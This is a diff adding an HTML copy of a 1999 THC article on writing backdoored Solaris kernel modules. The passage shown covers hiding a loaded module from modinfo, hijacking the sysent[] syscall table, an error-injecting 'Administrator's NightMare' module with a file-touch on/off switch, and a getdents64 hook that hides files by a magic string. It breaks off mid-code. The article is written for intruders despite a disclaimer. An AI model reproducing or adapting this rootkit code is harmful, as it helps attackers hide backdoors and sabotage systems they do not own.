@@ -1,0 +1,1025 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.6 [en] (X11; I; SunOS 5.7 i86pc) [Netscape]">
+</head>
+<body text="#000000" bgcolor="#FFFFFF" link="#0000EF" vlink="#51188E" alink="#FF0000">
+&nbsp;
+<br>&nbsp;
+<center><table COLS=1 WIDTH="100%" NOSAVE >
+<tr NOSAVE>
+<td NOSAVE>
+<center><font size=+3>Solaris Loadable Kernel Modules</font>
+<br><i>"Attacking Solaris with loadable kernel modules" - </i>Version 1.0&nbsp;
+(c) 1999
+<p>Author: Plasmoid &lt;<a href="mailto:plasmoid@pimmel.com">plasmoid@pimmel.com</a>>
+/ THC
+<br>Sources: <a href="slkm-1.0.tar.gz">slkm-1.0.tar.gz</a>
+(flkm.c, anm.c, sitf0.1.c, sitf02.c)
+<br>The Hacker's Choice Website: <a href="http://www.thc.org/">http://www.thc.org/</a></center>
+
+<p><br>
+<br>
+<br>
+<br>
+<br>
+<p><font size=+1>Content</font>
+<ol>1&nbsp;&nbsp; Introduction
+<br>2&nbsp;&nbsp; (Un)Loading of kernel modules
+<br>3&nbsp;&nbsp; Basic structure of kernel modules under Solaris
+<ol>3.1&nbsp;&nbsp; Standard headers and structs
+<br>3.2&nbsp;&nbsp; Hiding the module
+<br>3.3&nbsp;&nbsp; _init(), _fini() and _info() calls
+<br>3.4&nbsp;&nbsp; Compiling and linking modules
+<br>--->&nbsp;&nbsp; Module: flkm.c</ol>
+4&nbsp;&nbsp; Redirecting syscalls and managing memory
+<ol>4.1&nbsp;&nbsp; Syscalls under Solaris
+<br>4.2&nbsp;&nbsp; Generating errno messages
+<br>4.3&nbsp;&nbsp; Allocating kernel memory
+<br>--->&nbsp;&nbsp; Module: anm.c</ol>
+5&nbsp;&nbsp; Implementing the common backdoors
+<ol>5.1&nbsp;&nbsp; Hiding files from getdents64()
+<br>5.2&nbsp;&nbsp; Hiding directories and file content
+<br>5.3&nbsp;&nbsp; Generating a remote switch
+<br>5.4&nbsp;&nbsp; Hiding processes (proc file system approach)
+<br>--->&nbsp;&nbsp; Module: sitf0.1.c&nbsp;
+<br>5.5&nbsp;&nbsp; Redirecting an execve() call
+<br>5.6&nbsp;&nbsp; Hiding processes (structured proc approach)
+<br>--->&nbsp;&nbsp; Module: sitf0.2.c</ol>
+6&nbsp;&nbsp; Future plans
+<br>7&nbsp;&nbsp; Closing words</ol>
+
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+1>1&nbsp;&nbsp; Introduction</font>
+<blockquote>Loadable kernel modules represent an important part of the
+kernel architecture. They provide an interface to hardware devices and
+data within the kernel memory. Most Unix systems enforce the usage of loadable
+kernel modules in order to offer maximum interaction with the peripherials
+and the kernel.&nbsp;
+<br>Due to those features, kernel modules have gained the interest of intruders,
+since they affect the operating system at the basic level and guarantee
+an efficient and hard to detect way to manipulate the system. In the past
+years loadable kernel modules including backdoors have been published for
+Unix systems such as Linux and FreeBSD. This article describes the technologies
+used to develop backdoored modules for the operating system Solaris 2.7
+(Sparc/Intel).
+<br>The modules conributed with this article have not been tested on Solaris
+2.6 (Sparc), if you are interested
+in testing these modules, please contact <a href="mailto:plasmoid@pimmel.com">me</a>.
+<br>Eventhough most sources listed in this article haven been tested on
+several computers running Solaris 2.7 (Ultra Sparc/Sparc/x86) and
+Solaris 2.6 (Ultra Sparc), they might crash or even destroy
+your system, therefore use all modules from the <a href="slkm-1.0.tar.gz">slkm-1.0.tar.gz</a>
+tarball with care. The modules have not been tested using Sun's C Compiler,
+instead we used the free Gnu C Compiler - available from <a href="http://www.sunfreeware.com/">sunfreeware.com</a>.
+<br>This article and its sources are designed for educational puroses only,
+I strongly advise you not to use any modules provided with this article
+on systems you do not own or aren't allowed to manipulate.</blockquote>
+
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+1>2&nbsp;&nbsp; (Un)Loading of kernel modules</font>
+<blockquote>Most parts of Solaris' functionality are realized using kernel
+modules (e.g. ip/tcp, scsi, ufs), tools from other vendors or authors use
+this mechanism too (e.g. ipf, pppd, oss), you can get a list of all loaded
+and (in)active modules by using the command <tt>/usr/sbin/modinfo.</tt>
+<blockquote><tt># modinfo</tt>
+<br><tt>&nbsp;Id Loadaddr&nbsp;&nbsp; Size Info Rev Module Name</tt>
+<br><tt>&nbsp; 4 fe8c6000&nbsp;&nbsp; 313e&nbsp;&nbsp; 1&nbsp;&nbsp; 1&nbsp;
+specfs (filesystem for specfs)</tt>
+<br><tt>&nbsp; 6 fe8ca414&nbsp;&nbsp; 2258&nbsp;&nbsp; 1&nbsp;&nbsp; 1&nbsp;
+TS (time sharing sched class)</tt>
+<br><tt>&nbsp; 7 fe8cc228&nbsp;&nbsp;&nbsp; 4a2&nbsp;&nbsp; -&nbsp;&nbsp;
+1&nbsp; TS_DPTBL (Time sharing dispatch table)</tt>
+<br><tt>&nbsp; 8 fe8cc27c&nbsp;&nbsp;&nbsp; 194&nbsp;&nbsp; -&nbsp;&nbsp;
+1&nbsp; pci_autoconfig (PCI BIOS interface)</tt>
+<br><tt>#</tt></blockquote>
+<tt>Id</tt> is the module-id, <tt>Loadaddr </tt>is the starting text address
+in hexadecimal, <tt>Size</tt> is the size of text, data, and bss in hexadecimal
+bytes, <tt>Info</tt> is module specific information, <tt>Rev</tt> is the
+revision of the loadable modules system, and<tt> Module Name</tt> is the
+filename and description of the module.&nbsp;
+<br>Device driver or pseudo device driver modules include an <tt>Info</tt>
+number, modules which do not communicate with a device do not include this
+information. These modules are declared as "misc" (<tt>&amp;mod_miscops</tt>)
+modules. Since we are developing a kernel module for an attacking approach,
+we will later generate such a miscellaneous module.
+<p>In order to load or unload kernel modules, you can use the two commands
+<tt>/usr/sbin/modload
+</tt>and<tt>
+/usr/sbin/modunload. </tt>Modload's command line is the name of a module
+and modunload's command line "<tt>-i ID</tt>" the <tt>Id </tt>of a loaded
+module (see modinfo above.).&nbsp;
+<blockquote><tt># modinfo -i 125</tt>
+<br><tt>&nbsp;Id Loadaddr&nbsp;&nbsp; Size Info Rev Module Name</tt>
+<br><tt>125 fe95959c&nbsp;&nbsp;&nbsp; 125&nbsp;&nbsp; -&nbsp;&nbsp; 1&nbsp;
+flkm (First Loadable Kernel Module)</tt>
+<br><tt># modunload -i 125</tt></blockquote>
+Solaris includes a lot of good man pages dealing with kernel modules, (un)loading,
+information and even programming. You should take a look at those, but
+don't get confused the example code within "man _init" compiles but does
+not load. If you have access to Solaris' AnswerBook2 take a look at the
+sections describing the development of device drivers.</blockquote>
+
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+1>3&nbsp;&nbsp; Basic structure of kernel modules under
+Solaris</font>
+<blockquote>Kernel modules under Solaris need a lot of definied variables
+in order to get loaded into the system, this is a major difference to Linux
+kernel modules that can easily be created by just using an <tt>init_module()
+</tt>and
+<tt>cleanup_module()</tt>
+call. Take a look at pragmatic's articles about kernel modules for <a href="LKM_HACKING.html">Linux</a>
+and <a href="bsdkern.html">FreeBSD</a>.</blockquote>
+<font size=+1>3.1&nbsp;&nbsp; Standard headers and structs</font>
+<blockquote>Eventhough we don't want to develop a device driver module,
+we have to include the DDI, SunDDI and the modctl headers that provide
+us with structs as <tt>modlinkage</tt> and <tt>mod_ops</tt>. The first
+lines of a module look like this:
+<blockquote><tt>#include &lt;sys/ddi.h></tt>
+<br><tt>#include &lt;sys/sunddi.h></tt>
+<p><tt>/*</tt>
+<br><tt>&nbsp;* This is the loadable module wrapper.</tt>
+<br><tt>&nbsp;*/</tt>
+<br><tt>#include &lt;sys/modctl.h></tt>
+<p><tt>extern struct mod_ops mod_miscops;</tt>
+<p><tt>/*</tt>
+<br><tt>&nbsp;* Module linkage information for the kernel.</tt>
+<br><tt>&nbsp;*/</tt>
+<br><tt>static struct modlmisc modlmisc = {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; &amp;mod_miscops,</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; "First Loadable Kernel Module",</tt>
+<br><tt>};</tt>
+<p><tt>static struct modlinkage modlinkage = {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; MODREV_1,</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; (void *)&amp;modlmisc,</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; NULL</tt>
+<br><tt>};</tt></blockquote>
+As you can see, we include some external structs into the module and define
+the name of the kernel module inside the <tt>modlmisc</tt> struct. The
+<tt>modlinkage</tt>
+struct references <tt>modlmisc</tt> and tells the kernel that this is not
+a device driver module and that no info flag is displayed by <tt>modinfo</tt>.
+If you want to go into the details of these structs and maybe develop device
+or pseudo device driver module, take a look at the following man pages:
+modldrv(9S), modlinkage(9S) and modlstrmod(9S). If you just want to understand
+the backdoored modules in this article, simply read on.</blockquote>
+<font size=+1>3.2&nbsp;&nbsp; Hiding the module</font>
+<blockquote>If we change the name of the kernel module to an empty string
+("") in the <tt>modlmisc</tt> struct, <tt>modinfo</tt> will not display
+the module, eventhough it is loaded and its <tt>Id</tt> is reserved. This
+is a useful feature for hiding the module and the module can still be unloaded
+if you know its Id. Grabbing this <tt>Id</tt> is simple, if you take a
+look at the modules <tt>Id</tt>s before loading the module and later after
+some other modules have been loaded.
+<blockquote><tt># modinfo</tt>
+<br><tt>&nbsp;Id Loadaddr&nbsp;&nbsp; Size Info Rev Module Name</tt>
+<br>[...]
+<br><tt>122 fe9748e8&nbsp;&nbsp;&nbsp; e08&nbsp; 13&nbsp;&nbsp; 1&nbsp;
+ptem (pty hardware emulator)</tt>
+<br><tt>123 fe983fd8&nbsp;&nbsp;&nbsp; 1c0&nbsp; 14&nbsp;&nbsp; 1&nbsp;
+redirmod (redirection module)</tt>
+<br><tt>124 fe9f60a4&nbsp;&nbsp;&nbsp; cfc&nbsp; 15&nbsp;&nbsp; 1&nbsp;
+bufmod (streams buffer mod)</tt>
+<br><tt># modload flkm</tt>
+<br>&nbsp;
+<p><tt># modinfo</tt>
+<br><tt>&nbsp;Id Loadaddr&nbsp;&nbsp; Size Info Rev Module Name</tt>
+<br>[...]
+<br><tt>122 fe9748e8&nbsp;&nbsp;&nbsp; e08&nbsp; 13&nbsp;&nbsp; 1&nbsp;
+ptem (pty hardware emulator)</tt>
+<br><tt>123 fe983fd8&nbsp;&nbsp;&nbsp; 1c0&nbsp; 14&nbsp;&nbsp; 1&nbsp;
+redirmod (redirection module)</tt>
+<br><tt>124 fe9f60a4&nbsp;&nbsp;&nbsp; cfc&nbsp; 15&nbsp;&nbsp; 1&nbsp;
+bufmod (streams buffer mod)</tt>
+<br><tt>126 fe9f8e5c&nbsp;&nbsp; 8e3c&nbsp; 13&nbsp;&nbsp; 1&nbsp; pcfs
+(filesystem for PC)</tt>
+<br><tt>127 fea018d4&nbsp;&nbsp; 19e1&nbsp;&nbsp; -&nbsp;&nbsp; 1&nbsp;
+diaudio (Generic Audio)</tt>
+<br><tt>128 fe94aed0&nbsp;&nbsp;&nbsp; 5e3&nbsp; 72&nbsp;&nbsp; 1&nbsp;
+ksyms (kernel symbols driver)</tt>
+<br>&nbsp;</blockquote>
+</blockquote>
+
+<blockquote>As you can see the <tt>Id 125</tt> is obviously not reserved
+and we loaded our kernel module into the memory with no name string in
+the <tt>modlmisc</tt> struct. If we want to unload it now, we can easily
+do this by unloading the <tt>Id 125</tt>. Those unreserved <tt>Id</tt>s
+can be found in a <tt>modinfo</tt> listing at different places, but due
+to the fact that <tt>modunload</tt> won't return an error if you try to
+unload a non existing module, nobody can detect our module by using <tt>modinfo</tt>
+or <tt>modunload</tt>. The second version of this article will include
+mechanisms to completely protect a module from being listed and unloaded.
+This can only be done by patching the Solaris module ksyms that lists and
+manages all kernel symbols. Even if this protection leaving the module's
+name blank is weak, it will fit your needs, if the system administrator
+is not a real system programmer.</blockquote>
+<font size=+1>3.3&nbsp;&nbsp; _init(), _fini() and _info() calls</font>
+<blockquote>A kernel module under Solaris must include at least the following
+three functions: <tt>_init()</tt>, <tt>_fini()</tt> and <tt>_info()</tt>.
+<tt>_init()
+</tt>initializes
+a loadable module, it is called before any other routine in a loadable
+module. Within an <tt>_init()</tt> call you need to call another function
+called <tt>mod_install()</tt> that takes the <tt>modlinkage</tt> struct
+as an argument. <tt>_init()</tt> returns the value returned by mod_install().
+The returned value should be interpreted in order to catch errors while
+loading the module.
+<blockquote><tt>int _init(void)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int i;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if ((i = mod_install(&amp;modlinkage)) != 0)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"Could
+not install module\n");</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"flkm:
+successfully installed");</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; return i;</tt>
+<br><tt>}</tt></blockquote>
+The <tt>_info()</tt> function returns information about a loadable module,
+within this function the call <tt>mod_info() </tt>has to be made. If we
+use an empty name in the <tt>modinfo</tt> struct <tt>mod_info()</tt> will
+return no information to <tt>/usr/sbin/modinfo</tt>.&nbsp;
+<blockquote><tt>int _info(struct modinfo *modinfop)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; return (mod_info(&amp;modlinkage, modinfop));</tt>
+<br><tt>}</tt></blockquote>
+<tt>_fini()</tt> prepares a loadable module for unloading. It is called
+when the system wants to unload a module. Within <tt>_fini() </tt>a call
+to<tt> mod_remove()</tt> has to be placed. It is also wise to catch the
+return values in order to report errors while unloading the module.
+<blockquote><tt>int _fini(void)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int i;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if ((i = mod_remove(&amp;modlinkage)) != 0)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"Could
+not remove module\n");</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"flkm:
+successfully removed");</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; return i;</tt>
+<br><tt>}</tt></blockquote>
+A good documentation about these calls can be found in the following Solaris
+man pages: <tt>_info(9E)</tt> and <tt>mod_install(9F)</tt>. If you are
+calling <tt>cmn_err()</tt> with <tt>CE_NOTE</tt> as level from a running
+module the output will be printed to your syslogd as a notice. <tt>cmn_err()</tt>
+is function to output information from kernel memory, it can also be used
+to set run levels if you are debugging your module.</blockquote>
+<font size=+1>3.4 Compiling and linking modules</font>
+<blockquote>Compiling a module is very simple, all you need to set are
+some definitions that tell the included code this will be a kernel module
+and not a normal executable. You should always link your module's object
+file with the "-r" option otherwise the module will not load, because
+the kernel module linker will not be able to link the module.
+<blockquote><tt>gcc -D_KERNEL -DSVR4 -DSOL2 -O2 -c flkm.c</tt>
+<br><tt>ld -o flkm -r flkm.o</tt></blockquote>
+The Solaris kernel does not include as many standard C function as the
+Linux kernel, if you want to use some of those standard libC functions,
+extract them from the libc.a archive in /lib and link them to your module
+using the <tt>ar</tt> command. If you are one of those lucky guys owning
+the Solaris 2.7 source and knowing where to find what you are looking for
+inside the weird source of Solaris, include the original source of the
+extracted objects.
+<blockquote><tt>ar -x /lib/libc.a memmove.o memcpy.o strstr.o</tt>
+<br><tt>ld -o flkm -r flkm.o memmove.o memcpy.o strstr.o</tt></blockquote>
+In my examples I included a switch called <tt>DEBUG</tt>, this switch will
+activate a lot of debug outputs, if you are one of those nasty hackers
+don't forget to undefine <tt>DEBUG</tt> in the code or configure the Makefile.
+<tt>DEBUG
+</tt>is
+a very common definition if working with kernel modules, there are some
+kernel functions that might help you debugging, e.g. <tt>ASSERT()</tt>.</blockquote>
+<font size=+1>-->&nbsp;&nbsp; Module: flkm.c</font>
+<blockquote>The Module flkm.c (First Loadable Kernel Module) from the package
+<a href="slkm-1.0.tar.gz">slkm-1.0.tar.gz</a>
+demonstrates the techniques described in sections 3.1-3.4 and represents
+an empty working module that should be easily loadable into the kernel.</blockquote>
+
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+2>4&nbsp;&nbsp; </font><font size=+1>Redirecting syscalls
+and managing memory</font>
+<blockquote>Redirecting syscalls is one of the important things if you
+write backdoored kernel modules, instead of developing your own functions,
+you redirect the common syscalls to your fake syscalls that will do what
+ever you want. If you want to get an idea of what can be done using faked
+syscalls take a look at pragmatic's article at <a href="http://www.thc.org/">www.thc.org</a>.&nbsp;</blockquote>
+<font size=+2>4.1&nbsp;&nbsp; </font><font size=+1>Syscalls under Solaris</font>
+<blockquote>Syscalls under Solaris are stored in an array <tt>sysent[]
+</tt>each
+entry is a structure that hold information about a syscall. The values
+for all syscalls can be found in the file <tt>/usr/include/sys/syscall.h</tt>.
+If you take a closer look at the list of syscalls, you will recognize that
+there are some major differences to the Linux syscall header file. So be
+careful if you try to port a Linux kernel module to Solaris.&nbsp;
+<br>The syscalls
+<tt>open()</tt>,
+<tt>creat()</tt>, etc are not used for
+filesystem functions, instead the following calls are used
+<tt>open64()</tt>,
+<tt>creat64()</tt>,
+etc. Before you try to redirect a syscall under Solaris use the tool <tt>/usr/bin/truss</tt>
+to trace the syscalls of the programm that uses your syscalls, e.g. <tt>ps</tt>
+uses the <tt>open() </tt>call to check the files inside the proc tree while
+<tt>cat</tt>
+uses the <tt>open64()
+</tt>to open a file from the filesystems even if
+it is within the proc tree. Let's look at some example code:
+<blockquote><tt>int (*oldexecve) (const char *, const char *[], const char
+*[]);</tt>
+<br><tt>int (*oldopen64) (const char *path, int oflag, mode_t mode);</tt>
+<br><tt>int (*oldread) (int fildes, void *buf, size_t nbyte);</tt>
+<br><tt>int (*oldcreat64) (const char *path, mode_t mode);</tt>
+<br>[...]
+<p><tt>int newcreat64(const char *path, mode_t mode)&nbsp;</tt>
+<br><tt>{</tt>
+<br>[...]
+<p><tt>int _init(void)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int i;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if ((i = mod_install(&amp;modlinkage)) != 0)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"Could
+not install module\n");</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"anm:
+successfully installed");</tt>
+<br><tt>#endif</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; oldexecve = (void *) sysent[SYS_execve].sy_callc;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; oldopen64 = (void *) sysent[SYS_open64].sy_callc;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; oldcreat64 = (void *) sysent[SYS_creat64].sy_callc;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; oldread = (void *) sysent[SYS_read].sy_callc;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; sysent[SYS_execve].sy_callc = (void *) newexecve;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; sysent[SYS_open64].sy_callc = (void *) newopen64;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; sysent[SYS_creat64].sy_callc = (void *) newcreat64;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; sysent[SYS_read].sy_callc = (void *) newread;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; return i;</tt>
+<br><tt>}</tt></blockquote>
+This is an _init() call described in 3.3, after initializing the module
+we copy the pointers of the old syscalls that are stored in the member
+<tt>.sy_callc
+</tt>to
+some pointers we defined at the top of our module. This is done exactly
+as with all Linux kernel modules.
+<br>After we have saved the old pointers we copy pointers of our new syscalls
+(in this case: <tt>int newcreat64(const char *path,mode_t mode</tt>) to
+the pointers in the <tt>sysent[] </tt>array<tt>.</tt></blockquote>
+<font size=+1>4.2&nbsp;&nbsp; Generating errno messages</font>
+<blockquote>I have seen some loadable kernel modules that generate error
+message a way that wont work under Solaris, the so called error numbers
+listed in <tt>/usr/include/sys/errno.h</tt> should not be returned by function
+using the following code:
+<blockquote><tt>return -ENOENT;</tt></blockquote>
+Eventhough this code will work since a negative value is returned it does
+not tell Solaris what kind of error appeared, instead the following code
+using the syscall <tt>set_errno()</tt> is the correct solution.
+<blockquote><tt>set_errno(ENOENT);</tt>
+<br><tt>return -1;</tt></blockquote>
+You really should tell your operating system what is going wrong even if
+you produce a fake error message.&nbsp;</blockquote>
+<font size=+1>4.3&nbsp;&nbsp; Allocating kernel memory</font>
+<blockquote>When working inside the kernel, you cannot allocate memory
+using the function <tt>alloc()</tt> or <tt>malloc()</tt> due to the fact
+that the kernel memory is strictly seperated from the user memory. Solaris
+provides to function for allocating and freeing kernel memory.
+<blockquote><tt>name = (char *) kmem_alloc(size, KM_SLEEP);</tt></blockquote>
+<tt>kmem_alloc()</tt> allocates <tt>size</tt> bytes of kernel memory and
+returns a pointer to the allocated memory. The allocated memory is at least
+double-word aligned, so it can hold any C data structure. No greater alignment
+can be assumed. The second parameter determines whether the caller can
+sleep for memory. <tt>KM_SLEEP</tt> allocations may sleep but are guaranteed
+to succeed. <tt>KM_NOSLEEP</tt> allocations are guaranteed not to sleep
+but&nbsp; may fail&nbsp; (return <tt>NULL</tt>) if no memory is currently
+available. <tt>KM_NOSLEEP</tt> using <tt>kmem_alloc()</tt> should only be
+used from interrupt context, it should not be called otherwise.  
+The initial contents of memory allocated using <tt>kmem_alloc()
+</tt>are
+random garbage.
+<br>The allocated kernel memory has to be freed using the function <tt>kmem_free(size)</tt>,
+while size is the size of the allocated memory. Be careful, if you are
+freeing more memory as you allocated major problems will occur, since unwanted
+parts of the kernel get freed.
+<p>As I started coding this module I didn't care about the transfer between
+user and kernel memory. On Solaris 2.7 (x86) a <tt>memcpy()</tt> successfully
+solved this task and there was no need for special commands. But on Solaris
+(Sparc) this lousy way of transfering data didn't work at all. For a proper
+transfer use the functions<tt> copyin() </tt>and<tt> copyout()</tt> that
+provide a way to transfer data from kernel memory (device module memory)
+and user memory.&nbsp;
+<br>If you want to copy null-terminated strings from userspace to kernel
+memory use the command <tt>copyinstr()</tt>, that has the following
+prototype
+<tt>copyinstr(char *src, char *dst, size_t length, size_t size)</tt>. <tt>length</tt>
+describes how many bytes to read while <tt>size</tt> is the value of actually
+read bytes.
+<br>A complete description of these functions can be found in the following
+Solaris man pages: kmem_alloc(9F), copyin(9F) and copyout(9F). Here is
+a small example:
+<blockquote><tt>&nbsp;&nbsp;&nbsp; name = (char *) kmem_alloc(256, KM_SLEEP);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; copyin(filename, name, 256);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; if (!strcmp(name, (char *) oldcmd)) {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copyout((char *) newcmd,
+(char *) filename, strlen(newcmd) + 1);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"sitf:
+executing %s instead of %s", newcmd, name);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; }</tt></blockquote>
+If you don't need to allocate kernel memory, e.g. if you are just comparing
+some values, you might use also the <tt>memcpy()</tt> function, but be
+adviced memcpy doesnot work on Ultra Sparc. Use <tt>copyinstr()</tt> in
+order to copy null terminated strings to kernel memory where you can compare
+them. copyinstr(char *src, char *dst, size_t n, size_t n)</blockquote>
+<font size=+1>-->&nbsp;&nbsp; Module: anm.c</font>
+<blockquote>As an example I included the module anm.c (Administrator's
+NightMare) from the package
+<a href="slkm-1.0.tar.gz">slkm-1.0.tar.gz</a>,
+this is not a very intelligent module - instead of backdooring the system,
+this module randomly generates system errors on the following syscalls:
+<tt>execve(),open64()</tt>
+and <tt>read()</tt>. The period of the random errors can be set with these
+three variables:
+<blockquote><tt>int open_rate = 200;</tt>
+<br><tt>int read_rate = 8000;</tt>
+<br><tt>int exec_rate = 400;</tt></blockquote>
+The values have been tested on a client station. The system behaves quite
+normal, but from time to time a small error appears that won't interest
+an admin. The system will just look like one of those badly configured
+cheap Solaris (but actually it isn't).&nbsp;
+<br>To activate or deactivate the errors I developed a switching mechanism,
+I will explain the technique later in 5.3, first of all here is the usage
+from the command line when the module is loaded.
+<blockquote><tt>touch my_stupid_key</tt></blockquote>
+This command enables or disables the functions of the anm.c module, if
+you used the correct key that has been defined inside the module you will
+get an error message instead of a touched "my_stupid_key" file.&nbsp;</blockquote>
+
+<hr SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+1>5&nbsp;&nbsp; Implementing the common backdoors</font>
+<blockquote>Most ideas of the backdoors I implemented have been taken from
+plaguez's itf.c module and the article written by pragmatic (see 7 References),
+some of them could be implemented as they are, other routines had to be
+rewritten and some had to be coded from scratch.
+<br>If you take a look at the modules sitf0.1.c and sitf0.2.c from the
+package <a href="slkm-1.0.tar.gz">slkm-1.0.tar.gz</a>
+you will find backdoors that are not described in this article, these function
+could be ported without any problem from Linux or FreeBSD modules. I think
+they have been documented in several other articles already.</blockquote>
+<font size=+1>5.1&nbsp;&nbsp; Hiding files from getdents64()</font>
+<blockquote>If you trace through commands as <tt>ls</tt> or <tt>du</tt>
+you will find out that Solaris systems use the <tt>getdents64()</tt> syscall
+to retrieve information about the content of a directory therefore I took
+a closer look at plaguez's implementation of a faked <tt>getdents() </tt>syscall
+hiding files from being listed.
+<br>While playing with his code I discovered that getting the entries from
+<tt>getdents64()</tt>
+is easier as on Linux, it is not necessary to care about user- and kernelsparce
+(well, I know this isn't a proper approach, but who cares), I simply modified
+his code to work with <tt>getdents64()</tt> and the <tt>dirent64</tt> entries
+used <tt>copyin()</tt> and <tt>copyout()</tt> (see 4.3 Allocation kernel
+memory). The
+<tt>getdents64()</tt> syscall and its structs are documented
+inside the Solaris man pages, take a look at the following pages: getdent(2),
+dirent(4), but keep in mind that you have to use the 64bit variants, just
+read the header file
+<tt>/usr/include/sys/dirent.h</tt> and you will find
+what you are looking for. A final version of a faked <tt>getdents64() </tt>syscall
+looks like that:
+<blockquote><tt>#define MAGIC&nbsp;&nbsp; "CHT.THC"</tt>
+<br><tt>char magic[] = MAGIC;</tt>
+<p>[...]
+<p><tt>int newgetdents64(int fildes, struct dirent64 *buf, size_t nbyte)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int ret, oldret, i, reclen;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; struct dirent64 *buf2, *buf3;&nbsp;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; oldret = (*oldgetdents64) (fildes, buf, nbyte);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; ret = oldret;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if (ret > 0) {&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf2 = (struct dirent64
+*) kmem_alloc(ret, KM_SLEEP);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copyin((char *) buf,
+(char *) buf2, ret);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf3 = buf2;&nbsp;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i = ret;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (i > 0) {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+reclen = buf3->d_reclen;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+i -= reclen;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+if (strstr((char *) &amp;(buf3->d_name), (char *) &amp;magic) != NULL)
+{</tt>
+<br><tt>#ifdef DEBUG&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+cmn_err(CE_NOTE,"sitf: hiding file (%s)", buf3->d_name);</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+if (i != 0)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
